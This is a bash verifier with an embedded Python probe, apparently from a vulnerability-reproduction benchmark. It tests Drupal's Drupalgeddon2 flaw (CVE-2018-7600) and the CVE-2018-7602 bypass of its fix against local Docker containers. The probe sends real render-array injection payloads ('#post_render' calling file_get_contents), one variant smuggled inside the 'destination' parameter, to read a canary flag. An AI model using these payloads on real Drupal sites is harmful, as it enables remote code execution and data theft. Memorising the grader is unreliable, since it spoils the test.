#!/usr/bin/env bash
# verify.sh --seed|--residual — drupal-core-cve-2018-7602（Drupalgeddon2 -> Drupalgeddon3）
#
# 漏洞机制：Drupal Renderer 把 render-array 中以 '#' 开头的键（#post_render/#markup 等）当作
# 可调用回调执行（CWE-94 任意回调 RCE）。守卫 = 官方镜像内真实的
# \Drupal\Core\Security\RequestSanitizer::sanitize()：
#   V0 drupal:8.5.0  无 RequestSanitizer            -> '#'-键直达 render sink（pre CVE-2018-7600）
#   V1 drupal:8.5.1  CVE-2018-7600 修复：只剥 GET/POST/COOKIE 顶层的 '#'-键（数组键），
#                    从不检查 'destination' 字符串内部 -> destination 通道仍开（不完整修复）<- TARGET
#   V2 drupal:8.5.3  CVE-2018-7602 修复：checkDestination() 用 UrlHelper::parse 解 destination
#                    内部 query 并剥 '#'-键 -> 通道关闭
#   seed     (CVE-2018-7600): '#'-键放在请求 query 顶层   -> V0 达 flag / V1 被 sanitize 剥掉
#   residual (CVE-2018-7602): '#'-键藏进 'destination' 参数内部 query（harness 用真实
#             UrlHelper::parse 重新解码进 render 数组）   -> V1 达 flag / V2 被 checkDestination 阻断
# 效果通道 = harness.php 的 JSON 响应 body（'rendered' 字段；flag 仅在 '#'-callable 真正执行、
#            file_get_contents 读出 /flag/pcb_flag.txt 时出现——该文件在 docroot 外，普通 GET 读不到）。
# 探测方式 = 自包含 python（与 poc/seed_exec.py 同语义：GET /harness.php + urlencode 参数），
#            宿主端口用 docker compose port 解析（fallback 固定映射 39480/39481/39482）。
# 判定基准 = RUN_FLAG_REF（平台注入的真 flag；wrong/stale 检查时 RUN_FLAG 为 override，
#            判定必须用 RUN_FLAG_REF，回退 RUN_FLAG）。
# 退出码：0=效果发生（RUN_FLAG_REF 出现在效果通道） 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }

CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
FLAG_REF="$RUN_FLAG"
mkdir -p "$WORK_DIR" 2>/dev/null || true

# 宿主端口：优先 compose 动态映射，fallback 固定映射表（compose 与 poc/seed_exec.py BASE 一致）
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-80}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT=39480;; v1) PORT=39481;; v2) PORT=39482;;
  esac
fi
# 动态端口优先（compose 已转 PORT_ 动态端口）；失败回退硬编码
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && PORT="$_DYN"
export PCB_TARGET_PORT="${PORT:-}"

# 就绪等待：Apache/PHP 冷启动较慢，起来前不探测（避免把启动慢误判为 10/20）
for _ in $(seq 1 90); do
  if curl -fsS -m 2 "http://127.0.0.1:$PORT/harness.php?ping=1" >/dev/null 2>&1; then break; fi
  sleep 1
done
if ! curl -fsS -m 2 "http://127.0.0.1:$PORT/harness.php?ping=1" >/dev/null 2>&1; then
  echo "verify: harness not ready on port $PORT" >&2
  exit 20
fi

# probe <seed|residual>：构造候选参数 -> GET /harness.php -> body 含 FLAG_REF -> 0；HTTP 无 flag -> 10；无响应 -> 20
probe() {
  local mode="$1" rc
  "$PY" - "$PORT" "$FLAG_REF" "$VERSION" "$mode" <<'PYEOF'
import json, sys, urllib.error, urllib.parse, urllib.request

port, flag, version, mode = sys.argv[1:5]
mode = mode.lstrip("-")          # shell 传入 "--seed"/"--residual"，归一化为 seed/residual
if mode == "seed":
    # CVE-2018-7600：'#'-渲染键放请求 query 顶层（original_poc.py candidate 的等价自包含构造）
    params = {
        "mode": "toplevel_render_key",
        "#post_render[]": "file_get_contents",   # 攻击者命名的可调用（良性读取器）
        "#markup": "/flag/pcb_flag.txt",          # 攻击者控制的参数 = canary 路径
    }
else:
    # CVE-2018-7602：'#'-键藏进 destination 字符串内部 query（bypass_poc.py 语义；自包含实现）
    inner = urllib.parse.urlencode({
        "#post_render[]": "file_get_contents",
        "#markup": "/flag/pcb_flag.txt",
    })
    params = {
        "mode": "destination_smuggled_render_key",
        "destination": "user/1/cancel?" + inner,
    }

url = "http://127.0.0.1:%s/harness.php?%s" % (port, urllib.parse.urlencode(params))
try:
    with urllib.request.urlopen(url, timeout=25) as r:
        body = r.read().decode("utf-8", "replace")
        status = r.getcode()
except urllib.error.HTTPError as e:
    status = e.code
    body = e.read().decode("utf-8", "replace")
except Exception as e:
    print("[probe %s] request error: %r" % (version, e), file=sys.stderr)
    sys.exit(20)
print("[probe %s] status=%s url_len=%d body_head=%r" % (version, status, len(url), body[:160]))
sys.exit(0 if flag in body else 10)
PYEOF
  rc=$?
  echo "[probe $VERSION] mode=$mode flag_ref=$FLAG_REF -> rc=$rc" >&2
  return $rc
}

probe "$MODE"
rc=$?
echo "verify[$MODE] version=$VERSION rc=$rc (flag_ref=$FLAG_REF)" >&2
exit "$rc"
